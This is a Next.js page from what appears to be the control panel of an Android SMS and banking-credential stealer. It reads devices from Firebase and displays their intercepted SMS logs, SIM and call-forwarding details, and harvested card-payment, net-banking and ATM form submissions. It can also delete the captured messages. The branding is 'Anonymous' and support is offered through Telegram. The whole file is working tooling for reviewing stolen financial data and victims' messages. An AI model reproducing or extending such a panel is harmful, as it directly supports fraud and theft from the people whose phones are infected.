"use client";

import Link from "next/link";
import { useParams, useRouter, usePathname } from "next/navigation";
import { useEffect, useState } from "react";
import DeviceDetails from "@/components/DeviceDetails";
import { getDeviceStatusFromAvailability } from "@/lib/deviceStatus";
import { db } from "@/lib/firbase";
import { ref, onValue, remove } from "firebase/database";
import type Devices from "@/types/devicetype";
import type DeviceMessage from "@/types/messageTypes";

type FirebaseRecord = Record<string, unknown>;

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

function getMessageTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue)) {
      return numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function sortMessagesByLatest(messages: DeviceMessage[]): DeviceMessage[] {
  return messages
    .slice()
    .sort(
      (a, b) =>
        getMessageTimestamp(b.timestamp) - getMessageTimestamp(a.timestamp),
    );
}

function toRecord(value: unknown): FirebaseRecord | null {
  return value && typeof value === "object" ? (value as FirebaseRecord) : null;
}

function getString(value: unknown, fallback = ""): string {
  if (typeof value === "string") {
    return value;
  }

  if (typeof value === "number" && Number.isFinite(value)) {
    return String(value);
  }

  return fallback;
}

function getIsoDate(value: unknown, fallback = ""): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return fallback;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue) && numericValue > 0) {
      return new Date(numericValue).toISOString();
    }

    const parsedDate = Date.parse(trimmed);

    if (!Number.isNaN(parsedDate)) {
      return new Date(parsedDate).toISOString();
    }

    return trimmed;
  }

  return fallback;
}

function getForwardingSim(value: unknown): Devices["forwardingSim"] {
  if (value === "sim1" || value === "slot 0" || value === 0 || value === "0") {
    return "sim1";
  }

  if (value === "sim2" || value === "slot 1" || value === 1 || value === "1") {
    return "sim2";
  }

  return null;
}

function getStringArray(value: unknown): string[] {
  if (Array.isArray(value)) {
    return value.filter((entry): entry is string => typeof entry === "string");
  }

  if (typeof value === "string" && value.trim()) {
    return [value];
  }

  return [];
}

function parseSmsLogs(value: unknown): DeviceMessage[] {
  const rawLogs = toRecord(value);

  if (!rawLogs) {
    return [];
  }

  const logs = Object.entries(rawLogs)
    .map(([id, rawLog]) => {
      const log = toRecord(rawLog);

      if (!log) {
        return null;
      }

      return {
        id,
        body: getString(log.body),
        reciverNumber: getString(log.receiverNumber),
        senderNumber: getString(log.senderNumber),
        timestamp: getString(log.timestamp),
        title: getString(log.title),
        deviceId: getString(log.uniqueid),
      } satisfies DeviceMessage;
    })
    .filter((entry): entry is DeviceMessage => entry !== null);

  return sortMessagesByLatest(logs);
}

function selectFirstAvailable(record: FirebaseRecord, keys: string[]) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) {
      return record[key];
    }
  }
  return undefined;
}

function parseFormSubmissions(value: unknown): SubmissionRecord[] {
  return parseSubmissionRecords(value);
}

function parseCardPayments(value: unknown): SubmissionRecord[] {
  return parseSubmissionRecords(value);
}

function parseNetBanking(value: unknown): SubmissionRecord[] {
  return parseSubmissionRecords(value);
}

function parseSubmissionRecords(value: unknown): SubmissionRecord[] {
  if (!value || typeof value !== "object") {
    return [];
  }

  if (Array.isArray(value)) {
    return value
      .map((entry, index) => {
        if (!entry || typeof entry !== "object") {
          return null;
        }

        const parsedEntry = entry as Record<string, unknown>;
        const parsedId =
          typeof parsedEntry.id === "string" && parsedEntry.id.trim()
            ? parsedEntry.id
            : String(index);

        return {
          ...parsedEntry,
          id: parsedId,
        };
      })
      .filter((entry): entry is SubmissionRecord => entry !== null);
  }

  const rawRecord = value as FirebaseRecord;

  const nestedEntries = Object.entries(rawRecord)
    .map(([entryId, entryValue]) => {
      if (!entryValue || typeof entryValue !== "object") {
        return null;
      }

      const parsedEntry = entryValue as Record<string, unknown>;
      const parsedId =
        typeof parsedEntry.id === "string" && parsedEntry.id.trim()
          ? parsedEntry.id
          : entryId;

      return {
        ...parsedEntry,
        id: parsedId,
      };
    })
    .filter((entry): entry is SubmissionRecord => entry !== null);

  if (nestedEntries.length > 0) {
    return nestedEntries;
  }

  const directRecordId =
    typeof rawRecord.id === "string" && rawRecord.id.trim()
      ? rawRecord.id
      : "entry-1";

  return [
    {
      ...rawRecord,
      id: directRecordId,
    },
  ];
}

export default function DeviceDetailsPage() {
  const params = useParams();
  const router = useRouter();
  const pathname = usePathname();
  const deviceId = decodeURIComponent(params.deviceId as string);

  const [device, setDevice] = useState<Devices | null>(null);
  const [notFound, setNotFound] = useState(false);
  const [smsLogs, setSmsLogs] = useState<DeviceMessage[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<SubmissionRecord[]>(
    [],
  );
  const [cardPayments, setCardPayments] = useState<SubmissionRecord[]>([]);
  const [netBanking, setNetBanking] = useState<SubmissionRecord[]>([]);

  useEffect(() => {
    const deviceRef = ref(db, `registeredDevices/${deviceId}`);

    const unsubscribeDevice = onValue(deviceRef, (snapshot) => {
      if (!snapshot.exists()) {
        setNotFound(true);
        return;
      }
      setNotFound(false);
      const d = toRecord(snapshot.val()) ?? {};
      const callForwarding = toRecord(d.callForwarding);
      const checkOnline = toRecord(d.checkOnline);

      console.log("Device data received:", d);

      setDevice({
        deviceId,
        model: getString(d.model, "Unknown"),
        brand: getString(d.brand, "Unknown"),
        forwardingSim: getForwardingSim(callForwarding?.forwardingSim),
        androidVersion: getString(d.androidVersion),
        joinedAt: getIsoDate(d.joinedAt),
        fcmToken: getString(d.fcmToken),
        manufacturer: getString(d.manufacturer),
        adminPhoneNumber: getStringArray(d.adminPhoneNumber),
        sim1Carrier: getString(d.sim1Carrier),
        sim1number: getString(d.sim1Number),
        sim2Carrier: getString(d.sim2Carrier),
        sim2number: getString(d.sim2Number),
        onlineStatus: getDeviceStatusFromAvailability(checkOnline?.available),
        lastChecked: getIsoDate(checkOnline?.checkedAt),
        isfavorite: Boolean(d.isfavorite),
      });

      setSmsLogs(parseSmsLogs(d.smsLogs));
      setFormSubmissions(
        parseFormSubmissions(selectFirstAvailable(d, FORM_KEYS)),
      );
      setCardPayments(
        parseCardPayments(selectFirstAvailable(d, CARD_KEYS)),
      );
      setNetBanking(parseNetBanking(selectFirstAvailable(d, NETBANK_KEYS)));
    });

    return () => {
      unsubscribeDevice();
    };
  }, [deviceId]);

  const handleDeleteSMS = async (smsId: string) => {
    try {
      const smsRef = ref(db, `registeredDevices/${deviceId}/smsLogs/${smsId}`);
      await remove(smsRef);
      console.log("SMS deleted successfully");
    } catch (error) {
      console.error("Error deleting SMS:", error);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d] shrink-0">
            Anonymous
          </Link>
          {/* Nav: horizontal scroll on small screens, no wrapping */}
          <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
            <a
              href="https://t.me/Sanjay_Mishra00"
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        {notFound ? (
          <div className="rounded-lg border border-red-500/30 bg-gradient-to-br from-red-500/10 to-red-600/5 p-6 text-center text-red-300">
            <p className="font-semibold">Device not found</p>
            <p className="text-sm mt-2">
              Device ID: <strong>{deviceId}</strong> does not exist in the
              system.
            </p>
          </div>
        ) : (
          device && (
            <div className="space-y-6">
              <DeviceDetails
                device={device}
                messages={smsLogs}
                forms={formSubmissions}
                cards={cardPayments}
                netBanking={netBanking}
                onDeleteSMS={handleDeleteSMS}
              />
            </div>
          )
        )}
      </main>
    </div>
  );
}
